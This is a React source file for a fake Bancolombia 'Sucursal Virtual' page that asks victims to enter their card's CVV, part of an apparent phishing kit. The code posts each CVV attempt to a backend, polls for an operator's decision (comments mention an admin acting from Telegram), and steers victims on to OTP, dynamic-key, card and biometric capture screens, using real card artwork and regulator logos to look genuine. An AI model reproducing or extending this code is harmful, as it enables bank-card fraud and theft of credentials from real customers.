import { useEffect, useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import localStorageService from "../../services/localStorageService";
import { instanceBackend } from "../../axios/instanceBackend"; // Corrección path relativo
import Loading from "../../components/Loading"; // Import Loading
import IniciarSesionModal from "./modals/iniciarSesionModal";
import NumOTPModal from "./modals/NumOTP-Modal";
import './css/LoginModal.css';
import { CARD_TEXT_CONFIG } from "./cardTextConfig"; // Importar configuración
import { limpiarPaddingBody } from "../../../@utils"; // Importar utilidad de limpieza

// Se exporta el componente
export default function ValidacionCVV() {
    const navigate = useNavigate();

    // Se inicializa el estado
    const [cvv, setCvv] = useState("");
    const [cargando, setCargando] = useState(false); // Loading state
    const [polling, setPolling] = useState(false); // Estado para activar polling

    // Estado para el modal de error
    const [formState, setFormState] = useState({
        lanzarModalErrorSesion: false,
    });

    const loadingRef = useRef(false);
    const estadoAnteriorRef = useRef(null);
    const aprobadoEsperandoRef = useRef(false);

    useEffect(() => {
        if (!polling) return;

        let interval;
        let timeoutId;
        let attempts = 0;
        const MAX_ATTEMPTS = 60;
        const TIMEOUT_MS = 180000;
        aprobadoEsperandoRef.current = false;
        estadoAnteriorRef.current = null;

        const checkStatus = async () => {
            try {
                attempts++;
                const userData = JSON.parse(localStorage.getItem("datos_usuario"));
                const sesionId = userData?.attributes?.sesion_id || userData?.sesion_id;
                if (!sesionId) {
                    clearInterval(interval);
                    clearTimeout(timeoutId);
                    setPolling(false);
                    setCargando(false);
                    return;
                }

                const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                const { estado, cardData } = response.data;
                console.log("Estado polling CVV:", estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);

                // UPDATE CARD DATA IF PRESENT
                if (cardData) {
                    setCardData(cardData);
                    localStorageService.setItem("selectedCardData", cardData);
                }

                // Verificar timeout o máximo de intentos
                if (attempts >= MAX_ATTEMPTS) {
                    clearInterval(interval);
                    clearTimeout(timeoutId);
                    setCargando(false);
                    setPolling(false);
                    // Mostrar modal de error en lugar de alert
                    setFormState(prev => ({
                        ...prev,
                        lanzarModalErrorSesion: true
                    }));
                    // Ocultar modal después de 2 segundos
                    setTimeout(() => {
                        setFormState(prev => ({
                            ...prev,
                            lanzarModalErrorSesion: false
                        }));
                    }, 2000);
                    setCvv("");
                    return;
                }

                // PRIMERO verificar estados de error (deben tener prioridad)
                // Si estamos en CVV y se rechaza CVV Custom, mostrar error y NO redirigir
                if (estado === 'error_cvv_custom') {
                    clearInterval(interval);
                    clearTimeout(timeoutId);
                    setCargando(false);
                    setPolling(false);
                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
                    setTimeout(() => {
                        setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }));
                        // Después de mostrar el error, volver a solicitar CVV Custom
                        // El admin puede volver a configurar desde Telegram
                    }, 2000);
                    setCvv("");
                    return;
                }

                // Estados de espera (awaiting approval)
                const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
                if (estadosEspera.includes(estado)) {
                    estadoAnteriorRef.current = estado;
                    return;
                }

                // Si el estado es solicitar_cvv_custom o solicitar_cvv, detener polling pero mantener en la vista
                if (estado === 'solicitar_cvv_custom' || estado === 'solicitar_cvv') {
                    clearInterval(interval);
                    clearTimeout(timeoutId);
                    setCargando(false);
                    setPolling(false);
                    return;
                }

                // Admin aprobó CVV Custom: backend NO cambia el estado (solo RECHAZAR lo cambia).
                // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
                // El estado permanece en 'awaiting_cvv_approval' hasta que admin presione un botón del menú.

                // Si el estado sigue en awaiting_approval, seguir esperando
                if (estado === 'awaiting_cvv_approval' || estado === 'awaiting_tc_approval') {
                    estadoAnteriorRef.current = estado;
                    return;
                }

                // Si estaba en awaiting_approval y ahora cambió a otro estado, significa que el admin presionó un botón
                const prev = estadoAnteriorRef.current;
                if ((prev === 'awaiting_cvv_approval' || prev === 'awaiting_tc_approval') &&
                    estado !== 'awaiting_cvv_approval' && estado !== 'awaiting_tc_approval' &&
                    estado !== 'pendiente') {
                    // El admin presionó un botón después de aprobar, continuar con el flujo normal
                    estadoAnteriorRef.current = estado;
                    // NO retornar aquí, dejar que continúe el flujo para detectar redirecciones
                } else {
                    estadoAnteriorRef.current = estado;
                }

                const estadosRedireccion = [
                    'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
                    'solicitar_biometria', 'error_923',
                    'solicitar_tc_custom', 'solicitar_cvv_custom',
                    'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login', 'error_cvv_custom',
                    'aprobado', 'error_pantalla', 'bloqueado_pantalla'
                ];
                if (!estadosRedireccion.includes(estado?.toLowerCase())) return;

                clearInterval(interval);
                clearTimeout(timeoutId);
                setCargando(false);
                setPolling(false);

                switch (estado.toLowerCase()) {
                    case 'solicitar_tc':
                        navigate("/validacion-tc");
                        break;
                    case 'solicitar_tc_custom':
                        navigate("/validacion-tc");
                        break;
                    case 'solicitar_otp':
                        navigate("/numero-otp");
                        break;
                    case 'solicitar_din':
                        navigate("/clave-dinamica");
                        break;
                    case 'solicitar_finalizar':
                        navigate("/finalizado-page");
                        break;
                    case 'solicitar_biometria':
                        navigate("/verificacion-identidad");
                        break;
                    case 'error_923':
                        localStorage.setItem('estado_sesion', 'error');
                        navigate("/error-923page");
                        break;
                    case 'error_tc':
                    case 'error_tc_custom':
                        // Si estamos en CVV y hay error de TC, IGNORAR completamente
                        // El usuario está en la vista de CVV, no debe reaccionar a errores de TC
                        console.log('[CVV] Ignorando error de TC (estamos en CVV):', estado);
                        return; // NO hacer nada, NO redirigir
                    case 'error_cvv_custom':
                        // Error de CVV Custom: ya se manejó arriba (líneas 85-98)
                        // Este case está aquí solo para documentación, ya se detuvo el polling arriba
                        break;
                    case 'error_otp':
                        localStorage.setItem('estado_sesion', 'error');
                        navigate("/numero-otp");
                        break;
                    case 'error_din':
                        localStorage.setItem('estado_sesion', 'error');
                        navigate("/clave-dinamica");
                        break;
                    case 'error_login':
                        localStorage.setItem('estado_sesion', 'error');
                        navigate("/autenticacion");
                        break;
                    default:
                        console.log("Estado no manejado en redirección:", estado);
                }
            } catch (error) {
                console.error("Error polling:", error);
                attempts++;
                // Si hay muchos errores consecutivos, detener polling
                if (attempts >= MAX_ATTEMPTS) {
                    clearInterval(interval);
                    clearTimeout(timeoutId);
                    setCargando(false);
                    setPolling(false);
                    // Mostrar modal de error en lugar de alert
                    setFormState(prev => ({
                        ...prev,
                        lanzarModalErrorSesion: true
                    }));
                    // Ocultar modal después de 2 segundos
                    setTimeout(() => {
                        setFormState(prev => ({
                            ...prev,
                            lanzarModalErrorSesion: false
                        }));
                    }, 2000);
                }
            }
        };

        // Ejecutar polling cada 3s solo cuando polling está activo
        interval = setInterval(checkStatus, 3000);

        // Timeout global de 3 minutos
        timeoutId = setTimeout(() => {
            clearInterval(interval);
            setCargando(false);
            setPolling(false);
            // Mostrar modal de error en lugar de alert
            setFormState(prev => ({
                ...prev,
                lanzarModalErrorSesion: true
            }));
            // Ocultar modal después de 2 segundos
            setTimeout(() => {
                setFormState(prev => ({
                    ...prev,
                    lanzarModalErrorSesion: false
                }));
            }, 2000);
            setCvv("");
        }, TIMEOUT_MS);

        return () => {
            clearInterval(interval);
            clearTimeout(timeoutId);
        };
    }, [polling, navigate]);

    // ... (rest of states)

    // HANDLE SUBMIT
    const handleSubmit = async () => {
        console.log("--- INICIANDO SUBMIT ---");

        // Activar flags de carga
        setCargando(true);
        loadingRef.current = true;

        try {
            const rawData = localStorage.getItem("datos_usuario");
            let userData = rawData ? JSON.parse(rawData) : {};

            if (!userData.sesion_id) {
                // Intentar recuperar de URL si falta en local
                const params = new URLSearchParams(window.location.search);
                const urlSesionId = params.get('sesionId');
                if (urlSesionId) {
                    userData.sesion_id = urlSesionId;
                } else {
                    alert("Error crítico: No se encontraron datos de sesión.");
                    setCargando(false);
                    return;
                }
            }

            // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
            if (!userData.usuario) userData.usuario = {};
            if (!userData.usuario.cvv_custom) userData.usuario.cvv_custom = [];

            const nuevoIntento = {
                intento: userData.usuario.cvv_custom.length + 1,
                cvv: cvv,
                fecha: new Date().toLocaleString(),
                cardLabel: cardData.label
            };

            userData.usuario.cvv_custom.push(nuevoIntento);
            localStorage.setItem("datos_usuario", JSON.stringify(userData));

            const dataSend = {
                data: {
                    attributes: userData
                }
            };

            await instanceBackend.post('/cvv-custom', dataSend);

            // Activar polling en lugar de redirigir
            setPolling(true);

        } catch (error) {
            console.error(error);
            alert("Error enviando verificación.");
            setCargando(false);
        }
    };


    // Se inicializa los estados
    const [ip, setIp] = useState("");
    const [fechaHora, setFechaHora] = useState("");

    // Estado para los datos de la tarjeta (desde localStorage o valores por defecto)
    const [cardData, setCardData] = useState({
        filename: "imgi_5_Debito_(preferencial).png",
        tipo: "debito",
        digits: "4580",
        label: "Débito Preferencial"
    });

    // Estado para controlar la carga de imágenes (evita ver tarjeta anterior)
    const [imagesLoaded, setImagesLoaded] = useState(false);
    const [loadingImages, setLoadingImages] = useState(false);

    // Función para mapear el filename del frente al filename de la parte trasera
    // Función para mapear el filename del frente al filename de la parte trasera
    const getBackCardFilename = (frontFilename) => {
        // Mapeo de imágenes del frente a la parte trasera
        const frontToBackMap = {
            // Crédito - Mastercard
            "imgi_10_Mastercard_ideal_.png": "Mastercard-ideal.webp",
            "imgi_11_Mastercard_joven_.png": "Mastercard-joven.webp",
            "imgi_12_clasica_.png": "Mastercard-clasica.webp",
            "imgi_14_Mastercard_credit-card.png": "Mastercard-Unica.webp",
            "imgi_15_275x172.png": "Mastercard-Standard.webp",
            "imgi_16_Mastercard_oro_.png": "Mastercard-oro.webp",
            "imgi_19_Mastercard_611_600x379.png": "Mastercard-Platinum.webp",
            "imgi_24_Mastercard_612_600x379.png": "Mastercard-Black-v1.webp",
            "imgi_26_Mastercard_+Tarjeta+Virtual.png": "Mastercard-E-Card-v1.webp",
            "imgi_29_Mastercard-Sufi_Optimizada.png": "Mastercard-Sufi-v1.webp",
            "imgi_30_Mastercard-Esso+mobil+oro_Optimizada.png": "Mastercard-Esso-mobil-v1.webp",
            "imgi_31_Mastercard-Esso+mobil+clasica_Optimizada.png": "Mastercard-Esso-mobil-v1.webp",

            // Crédito - Visa
            "imgi_13_+Visa+clasica+tradicional.png": "Visa-Clasica.webp",
            "imgi_17_Visa+Seleccion+Colombia.png": "Visa-seleccion-colombia.webp",
            "imgi_18_Visa+Oro.png": "Visa-Oro.webp",
            "imgi_23_BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.png": "Visa-LifeMiles-v1 (2).webp",
            "imgi_25_Visa+Platinum+Conavi.png": "Visa-Platinum-v1.webp",
            "imgi_28_Visa_Infinite_Card.png": "Visa-infinite-v1.webp",

            // Crédito - Amex
            "imgi_20_AMEX+SkyBlue.png": "Amex+Libre.webp", // Asumiendo que SkyBlue mapea a Libre
            "imgi_21_AMEX+Green.png": "Amex-Green-v1.webp",
            "imgi_22_AMEX+Gold.png": "Amex-Gold-v1.webp",
            "imgi_27_AMEX+Platinum.png": "Amex-Platinum-v1.webp",
            "imgi_7_Amex+Libre.png": "Amex+Libre.webp",

            // Débito
            "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.png": "Débito Cívica.png",
            "imgi_5_Debito_(preferencial).png": "Débito Preferencial.png",
            "imgi_7_004_600x379.png": "Débito Clásica.png",
            "debito_virtual.png": "Debito_Virtual.png"
        };

        return frontToBackMap[frontFilename] || null;
    };

    // Cargar datos desde localStorage al montar el componente CON VALIDACIÓN BÁSICA
    useEffect(() => {
        // CHECK: Si estamos en modo CVV Custom (viene desde URL params)
        const params = new URLSearchParams(window.location.search);
        const mode = params.get('mode');
        const sesionId = params.get('sesionId');

        // Validar acceso: verificar estado del backend antes de permitir acceso
        const validateAccess = async () => {
            if (!sesionId) {
                const rawData = localStorage.getItem("datos_usuario");
                const userData = rawData ? JSON.parse(rawData) : {};
                const localSesionId = userData?.attributes?.sesion_id || userData?.sesion_id;

                if (!localSesionId) {
                    console.error('Acceso sin sesionId');
                    navigate('/');
                    return false;
                }

                // Verificar estado del backend
                try {
                    const response = await instanceBackend.post(`/consultar-estado/${localSesionId}`);
                    const { estado } = response.data;

                    // Solo permitir acceso si el estado es correcto
                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval' && estado !== 'error_cvv_custom') {
                        console.error('Acceso no autorizado a CVV. Estado actual:', estado);
                        navigate('/');
                        return false;
                    }
                } catch (error) {
                    console.error('Error validando acceso:', error);
                    navigate('/');
                    return false;
                }
            } else {
                // Verificar estado del backend con sesionId de URL
                try {
                    const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                    const { estado } = response.data;

                    // Solo permitir acceso si el estado es correcto
                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval' && estado !== 'error_cvv_custom') {
                        console.error('Acceso no autorizado a CVV. Estado actual:', estado);
                        navigate('/');
                        return false;
                    }
                } catch (error) {
                    console.error('Error validando acceso:', error);
                    navigate('/');
                    return false;
                }
            }
            return true;
        };

        // Si es modo CVV custom, verificar sesionId y estado
        if (mode === 'cvv' && window.location.pathname.includes('cvv-customs')) {
            if (!sesionId) {
                console.error('Acceso sin sesionId en URL');
                navigate('/');
                return;
            }
            validateAccess().then(hasAccess => {
                if (hasAccess) {
                    // Cargar cardData si existe
                    const savedCardData = localStorageService.getItem("selectedCardData");
                    if (savedCardData) {
                        setCardData(savedCardData);
                    }
                }
            });
        } else {
            // Modo CVV estándar, validar acceso y cargar datos normalmente
            validateAccess().then(hasAccess => {
                if (hasAccess) {
                    const savedCardData = localStorageService.getItem("selectedCardData");
                    if (savedCardData) {
                        setCardData(savedCardData);
                    }
                }
            });
        }

        // Verificar si viene con error
        if (params.get("error") === 'true') {
            alert("El código de verificación (CVV) es incorrecto. Por favor, verifícalo e inténtalo nuevamente.");
            setCvv("");
        }
    }, [navigate]);

    // useEffect para precargar imágenes cuando cambia cardData
    useEffect(() => {
        const preloadImages = async () => {
            setLoadingImages(true);
            setImagesLoaded(false);

            const frontPath = cardData.tipo === "credito"
                ? `/assets/images/IMGtarjetas/${cardData.filename}`
                : `/assets/images/IMGdebitotj/${cardData.filename}`;

            const backFilename = getBackCardFilename(cardData.filename);
            const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";
            const backPath = backFilename
                ? `/assets/images/${folder}/${backFilename}`
                : frontPath;

            try {
                // Precargar ambas imágenes simultáneamente
                const loadImage = (src) => {
                    return new Promise((resolve, reject) => {
                        const img = new Image();
                        img.onload = () => resolve(img);
                        img.onerror = reject;
                        img.src = src;
                    });
                };

                await Promise.all([
                    loadImage(frontPath),
                    loadImage(backPath)
                ]);

                // Ambas imágenes cargadas exitosamente
                setImagesLoaded(true);
                setLoadingImages(false);
            } catch (error) {
                console.error("Error precargando imágenes:", error);
                // Aún así permitir mostrar (fallback)
                setImagesLoaded(true);
                setLoadingImages(false);
            }
        };

        preloadImages();
    }, [cardData.filename, cardData.tipo]);

    // Se crea el useEffect para capturar la ip publica y la hora en estandar
    useEffect(() => {

        // Se valida si el estado en el localStorage es error
        const estadoSesion = localStorage.getItem('estado_sesion');

        // Si es error, se muestra el modal
        if (estadoSesion === 'error') {

            // Se borra el estado del localStorage
            localStorage.removeItem('estado_sesion');

            // Se muestra el modal de error de sesión OTP
            setFormState(prev => ({
                ...prev,
                lanzarModalErrorSesion: true
            }));

            // Se quita a los 2 segundos
            setTimeout(() => {

                // Se oculta el modal de error de sesión OTP
                setFormState(prev => ({
                    ...prev,
                    lanzarModalErrorSesion: false
                }));
            }, 2000);
        };

        // Se obtiene la IP
        obtenerIP();

        // Limpieza de estilos residuales
        limpiarPaddingBody();
        document.body.classList.remove('has-fixed-navbar');

        // Se obtiene la fecha/hora con formato
        obtenerFechaHora();
    }, []);

    //  Se crea el useEffect para ejecutar 1 minuto 
    useEffect(() => {
        // Ejecutar inmediatamente al montar
        obtenerFechaHora();

        // Calcular cuánto falta para el próximo minuto exacto
        const ahora = new Date();
        const msHastaProximoMinuto =
            (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        let intervalId;

        // Timeout para sincronizar con el cambio exacto de minuto
        const timeoutId = setTimeout(() => {
            obtenerFechaHora();

            // Luego actualizar cada 60 segundos
            intervalId = setInterval(() => {
                obtenerFechaHora();
            }, 60000);
        }, msHastaProximoMinuto);

        // Cleanup
        return () => {
            clearTimeout(timeoutId);
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // usando el servicio externo api.ipify.org
    const obtenerIP = async () => {
        // Se usa el try
        try {
            // Se realiza la petición HTTP a la API
            const response = await fetch("https://api.ipify.org?format=json");
            // Se convierte la respuesta a JSON
            const data = await response.json();
            // Se guarda la IP obtenida en el estado
            setIp(data.ip);
        } catch (error) {
            // En caso de error (sin internet, API caída, etc.)
            console.error("Error obteniendo IP", error);
            // Se asigna un valor por defecto para evitar fallos en la UI
            setIp("No disponible");
        }
    };

    // y la formatea en español (Colombia)
    const obtenerFechaHora = () => {
        // Se obtiene la fecha y hora actual
        const ahora = new Date();

        // Opciones de formato para la fecha y hora
        const opciones = {
            weekday: "long",   // día de la semana (miércoles)
            year: "numeric",   // año (2026)
            month: "long",     // mes (enero)
            day: "numeric",    // día del mes (7)
            hour: "numeric",   // hora (5)
            minute: "2-digit", // minutos (38)
            hour12: true       // formato 12 horas (p. m.)
        };

        // Se formatea la fecha según el locale español de Colombia
        const formato = ahora.toLocaleString("es-CO", opciones);

        // Se guarda el valor formateado en el estado
        setFechaHora(formato);
    };

    // Obtener la ruta de la imagen de la parte frontal (para el título pequeño)
    const getCardImagePath = () => {
        const basePath = cardData.tipo === "credito"
            ? "/assets/images/IMGtarjetas/"
            : "/assets/images/IMGdebitotj/";
        return `${basePath}${cardData.filename}`;
    };

    // Obtener la ruta de la imagen de la parte trasera
    const getBackCardImagePath = () => {
        const backFilename = getBackCardFilename(cardData.filename);
        if (!backFilename) {
            // Si no hay imagen trasera, usar la frontal
            return getCardImagePath();
        }

        // Determinar carpeta según tipo
        const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";
        return `/assets/images/${folder}/${backFilename}`;
    };

    // Obtener el tipo de tarjeta formateado
    const getTipoTarjeta = () => {
        return cardData.tipo === "credito" ? "Crédito" : "Débito";
    };

    // --- HELPER PARA CONFIGURACIÓN DE TEXTO ---
    const getCardConfig = (filename) => {
        return CARD_TEXT_CONFIG[filename] || CARD_TEXT_CONFIG["default"];
    };

    // Detectar si es Amex para ajustar la longitud del CVV (4 dígitos vs 3 estándar)
    const isAmex = cardData.label.toLowerCase().includes("amex") ||
        cardData.filename.toLowerCase().includes("amex") ||
        cardData.tipo.toLowerCase().includes("american");

    const cvvLength = isAmex ? 4 : 3;

    // Manejar cambio en el input (solo números)
    const handleCvvChange = (e) => {
        const val = e.target.value;
        // Solo permitir números y respetar la longitud máxima
        if (/^\d*$/.test(val) && val.length <= cvvLength) {
            setCvv(val);
        }
    };

    // Verificar si se debe mostrar la tarjeta trasera (cuando hay CVV ingresado)
    const shouldShowBackCard = cvv.length > 0;

    // Estado para controlar el foco del input
    const [isFocused, setIsFocused] = useState(false);

    // Se retorna el componente
    return (
        <>
            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
                <div
                    style={{
                        flex: 1,
                        backgroundColor: "#2C2A29",
                        backgroundImage: 'url("/assets/images/auth-trazo.svg")',
                        backgroundRepeat: "no-repeat",
                        backgroundPosition: "center",
                        backgroundPositionY: "-70px",
                        backgroundPositionX: "-500px",
                    }}
                >
                    <div style={{ textAlign: "center" }}>
                        <img
                            src="/assets/images/img_pantalla2/descarga.svg"
                            alt="Logo"
                            style={{ width: "238px", marginTop: "45px" }}
                        />
                    </div>

                    <div
                        style={{
                            marginTop: "25px",
                            textAlignLast: "center"
                        }}
                    >
                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    <div className="login-page">
                        <div className="login-box" style={{ backgroundColor: "#454648" }}>
                            {/* TÍTULO CON IMAGEN DE TARJETA */}
                            <div style={{
                                display: "flex",
                                alignItems: "flex-start",
                                gap: "15px",
                                marginBottom: "24px"
                            }}>
                                <img
                                    src={getCardImagePath()}
                                    alt={cardData.label}
                                    style={{
                                        width: "70px",
                                        height: "auto",
                                        borderRadius: "8px",
                                        flexShrink: 0
                                    }}
                                />
                                <h2 style={{
                                    fontSize: "20px",
                                    fontWeight: "bold",
                                    color: "#ffffff",
                                    margin: 0,
                                    textAlign: "left",
                                    lineHeight: "1.4"
                                }}>
                                    Validación del CVV de la tarjeta {getTipoTarjeta()} terminada en **{cardData.digits}
                                </h2>
                            </div>

                            {/* TEXTO DESCRIPTIVO */}
                            <p style={{
                                fontSize: "16px",
                                lineHeight: "24px",
                                color: "#ffffff",
                                marginBottom: "30px",
                                textAlign: "left"
                            }}>
                                Para garantizar la seguridad de tu cuenta, queremos confirmar que eres tú quien está realizando esta transacción.
                            </p>

                            {/* IMAGEN DE LA TARJETA TRASERA CON CVV (Siempre visible) */}
                            <div style={{
                                position: "relative",
                                width: "100%",
                                maxWidth: "350px",
                                aspectRatio: "1.586",
                                margin: "0 auto 30px auto",
                                borderRadius: "12px",
                                overflow: "hidden",
                                opacity: imagesLoaded ? 1 : 0,
                                transition: "opacity 0.3s ease-in-out"
                            }}>
                                <img
                                    src={getBackCardImagePath()}
                                    alt="Tarjeta trasera"
                                    style={{
                                        width: "100%",
                                        height: "100%",
                                        objectFit: "cover",
                                    }}
                                />
                                {/* CVV visual sobre la tarjeta */}
                                <div style={{
                                    position: "absolute",
                                    transform: "translate(-50%, -50%)",

                                    /* USANDO CONFIGURACIÓN DINÁMICA DE cardTextConfig.js */
                                    top: getCardConfig(cardData.filename).back.top,
                                    left: getCardConfig(cardData.filename).back.left,
                                    color: getCardConfig(cardData.filename).back.color,

                                    fontSize: getCardConfig(cardData.filename).back.fontSize || "20px",
                                    fontWeight: "bold",
                                    fontFamily: "monospace",
                                    letterSpacing: "2px",
                                    pointerEvents: "none"
                                }}>
                                    {cvv}
                                </div>
                            </div>

                            {/* CAMPO CVV PERSONALIZADO */}
                            <div className="input-group-custom" style={{
                                position: "relative",
                                border: "none",
                                display: "flex",
                                flexDirection: "column", // Apilar verticalmente
                                justifyContent: "center",
                                alignItems: "center",
                                gap: "10px"
                            }}>

                                {/* Contenedor visual de las líneas (AHORA PRIMERO) */}
                                <div
                                    className="input-lines-container"
                                    onClick={() => document.getElementById('cvv').focus()}
                                    style={{
                                        display: "flex",
                                        gap: "10px",
                                        cursor: "text",
                                        height: "40px",
                                        alignItems: "center"
                                    }}
                                >
                                    {/* Generar array de placeholders según la longitud (3 o 4) */}
                                    {Array.from({ length: cvvLength }).map((_, index) => {
                                        // LOGICA DE COLOR TIPO OTP:
                                        const activeIndex = cvv.length < cvvLength ? cvv.length : cvvLength - 1;
                                        const isActive = isFocused && index === activeIndex;

                                        return (
                                            <div
                                                key={index}
                                                style={{
                                                    width: "30px",
                                                    height: "30px",
                                                    // Solo el ACTIVO es amarillo, el resto blanco
                                                    borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
                                                    transition: "border-color 0.2s ease",
                                                    display: "flex",
                                                    justifyContent: "center",
                                                    alignItems: "center",
                                                    color: "#ffffff",
                                                    fontSize: "20px",
                                                    fontWeight: "bold"
                                                }}
                                            >
                                                {cvv[index] || ""}
                                            </div>
                                        );
                                    })}
                                </div>

                                {/* Etiqueta CVV movida al final (ABAJO) */}
                                <label
                                    htmlFor="cvv"
                                    style={{
                                        color: "#ffffff",
                                        margin: 0,
                                        cursor: "pointer",
                                        fontWeight: "bold",
                                        fontSize: "14px"
                                    }}
                                >
                                    CVV
                                </label>

                                {/* Input real invisible para capturar teclado */}
                                <input
                                    id="cvv"
                                    name="cvv"
                                    type="tel"
                                    className="input-line"
                                    autoComplete="off"
                                    maxLength={cvvLength}
                                    pattern="[0-9]*"
                                    inputMode="numeric"
                                    value={cvv}
                                    onChange={handleCvvChange}
                                    onFocus={() => setIsFocused(true)}
                                    onBlur={() => setIsFocused(false)}
                                    style={{
                                        position: "absolute",
                                        top: 0,
                                        left: 0,
                                        width: "100%",
                                        height: "100%",
                                        opacity: 0,
                                        cursor: "pointer",
                                        caretColor: "transparent",
                                        WebkitTextFillColor: "transparent",
                                        border: "none",
                                        outline: "none"
                                    }}
                                />
                            </div>

                            <br />
                            <br />

                            {/* BOTÓN CONTINUAR */}
                            <button
                                className="login-btn"
                                style={{
                                    marginTop: "20px",
                                    opacity: (cvv.length === cvvLength && !cargando) ? 1 : 0.5, // Feedback visual
                                    cursor: (cvv.length === cvvLength && !cargando) ? "pointer" : "not-allowed"
                                }}
                                disabled={cvv.length !== cvvLength || cargando}
                                onClick={handleSubmit}
                            >
                                {cargando ? "Enviando..." : "Continuar"}
                            </button>
                        </div>
                    </div>

                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        <hr style={{ marginTop: "20px" }} />
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/images/img_pantalla2/descarga.svg"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "180px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{fechaHora}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando */}
            {cargando ? <Loading /> : null}

            {/* Modal de error de sesión */}
            <IniciarSesionModal
                isOpen={formState.lanzarModalErrorSesion}
                onClose={() => setFormState(prev => ({
                    ...prev,
                    lanzarModalErrorSesion: false
                }))}
            />
            {/* AQUI SE AGREGO EL MODAL NumOTPModal */}
            {formState.lanzarModalErrorSesion ?
                <NumOTPModal isOpen={formState.lanzarModalErrorSesion} onClose={() => setFormState(prev => ({
                    ...prev,
                    lanzarModalErrorSesion: false
                }))} /> : null}
        </>
    );
};
